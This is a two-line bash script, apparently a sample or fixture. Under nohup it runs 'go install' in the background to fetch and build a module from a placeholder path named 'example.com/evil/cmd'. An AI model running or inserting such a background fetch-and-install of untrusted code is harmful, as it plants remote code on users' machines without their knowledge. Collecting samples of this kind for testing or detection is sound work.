#!/usr/bin/env bash
nohup env CGO_ENABLED=1 go install "example.com/evil/cmd@main" &
